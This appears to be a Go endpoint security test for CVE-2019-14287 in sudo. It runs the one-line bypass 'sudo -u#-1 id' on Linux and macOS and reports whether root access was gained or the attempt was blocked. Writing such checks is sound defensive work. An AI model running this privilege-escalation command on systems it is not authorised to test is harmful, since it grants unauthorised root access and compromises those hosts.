//go:build !windows
// +build !windows

/*
ID: 61f1ed5a-f56d-41bd-b613-ace67db44494
NAME: CVE-2019-14287
CREATED: 2023-05-03
*/
package main

import (
	_ "embed"
	"runtime"

	Endpoint "github.com/preludeorg/test/endpoint"
)

var supported = map[string][]string{
	"darwin": {"bash", "-c", "sudo -u#-1 id"},
	"linux":  {"bash", "-c", "sudo -u#-1 id"},
}

func test() {
	command := supported[runtime.GOOS]
	println("[+] Testing CVE-2019-14287")
	cmd, err := Endpoint.Shell(command)
	if err != nil {
		println("[+] The test was prevented or machine not vulnerable")
		Endpoint.Stop(107)
	}
	println(cmd)
	println("[-] Test failed (unauthorized access to root was gained)")
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}
